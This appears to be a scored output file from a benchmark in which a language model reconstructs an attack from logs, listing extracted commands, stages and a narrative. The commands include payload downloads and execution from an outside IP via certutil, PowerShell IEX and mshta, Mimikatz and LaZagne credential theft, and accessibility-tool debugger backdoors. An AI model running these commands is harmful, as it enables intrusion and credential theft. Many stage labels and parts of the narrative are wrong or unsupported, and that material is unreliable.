@@ -1,0 +1,176 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/a",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\ufffd\ufffd\ud835\ufffdB.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003 -TestNumbers 1",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe\" & {New-Item -Path $env:TEMP\\T1059_1.txt Get-ChildItem Env: > $env:TEMP\\T1059_2.txt Get-Process > $env:TEMP\\T1059_3.txt}",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1119 ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.005  -TestNumbers 1",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /C mimikatz2.exe  lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /C mimikatz.exe  LSADUMP::DCSync exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "lazagne1.exe browsers",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{New-Item -Path $env:TEMP\\T1119_1.txt Get-ChildItem Env: > $env:TEMP\\T1119_2.txt Get-Process > $env:TEMP\\T1119_3.txt}\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\") $Name = \"Debugger\" $Value = \"C:\\\\windows\\\\system32\\\\cmd.exe\" Foreach ($item in $input_table){ $item = $item.trim() $registryPath = \"hkLM:\\\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\$item\"\" IF(!(Test-Path $registryPath)) { New-Item -Path $registryPath -Force New-ItemProperty -Path $registryPath -Name $name -Value $value}}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add `\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options`\" /v `\"verifierdlls`\" /d `\"1`\" /f\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe & {$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\") $Name = \"Debugger\" $Value = \"C:\\\\windows\\\\system32\\\\cmd.exe\" Foreach ($item in $input_table){ $item = $item.trim() $registryPath = \"hkLM:\\\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\$item\"\" IF(!(Test-Path $registryPath)) { New-Item -Path $registryPath -Force New-ItemProperty -Path $registryPath -Name $name -Value $value}}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group `\"domain admins`\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C mkdir C:\\%HOMEPATH%\\Desktop\\T1022  & echo ipconfig /all > C:\\%HOMEPATH%\\Desktop\\T1022\\T1022.txt &  7z.exe a -tzip T1022.zip C:\\%HOMEPATH%\\Desktop\\T1022",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Copy-Item '.\\.msxsl.exe' 'c:\\Windows\\Temp\\.msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest t1547.001 -TestNumbers 1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1548.002 -TestNumbers 2",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe & {New-Item -Path $env:TEMP\\T1119_1.txt Get-ChildItem Env: > $env:TEMP\\T1119_2.txt Get-Process > $env:TEMP\\T1119_3.txt}",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe & {\u00a0$input_table = \"osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\".split(\",\")Foreach (\u00a0$item in $input_table){\u00a0$item = $item.trim()\u00a0$registryPath = \"hkLM:\\\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\$item\"\u00a0IF(!(Test-Path $registryPath)) {\u00a0New-Item -Path $registryPath -Force \u00a0New-ItemProperty -Path $registryPath -Name Debugger -Value C:\\\\Windows\\\\system32\\\\cmd.exe}}",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe & {New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}",
+        "stage": "Collection"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe & {Start-Process $env:TEMP\\T1059.003_script.bat}",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe & {cmd /c \"for /l %x in (1,1,75) do start wordpad.exe /p $env:temp\\T1059_003note.txt\" | out-null}",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The attackers conducted a complex series of operations involving initial access via HTTP download, followed by exploitation of system weaknesses and privilege escalation. They established persistence using scheduled tasks and registry modifications, collected local files and system data, stole login credentials, evaded detection by manipulating image file execution options, executed additional commands via remote web requests, utilized PSImage to inject malicious payloads, created new user accounts, and carried out various other actions to maintain their presence within the system.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 42378,
+      "completion_tokens": 5488,
+      "total_tokens": 47866,
+      "wall_clock_s": 217.95,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.45161290322580644,
+      "recall": 0.3783783783783784,
+      "f1": 0.411764705882353,
+      "tp": 14,
+      "fp": 17,
+      "fn": 23
+    },
+    "stage": {
+      "precision": 0.1935483870967742,
+      "recall": 0.15789473684210525,
+      "f1": 0.17391304347826086,
+      "tp": 6,
+      "fp": 25,
+      "fn": 32,
+      "recall_partial": 0.25675675675675674
+    },
+    "hallucination_rate": 0.08333333333333333,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 42378,
+      "completion_tokens": 5488,
+      "total_tokens": 47866,
+      "wall_clock_s": 217.95,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
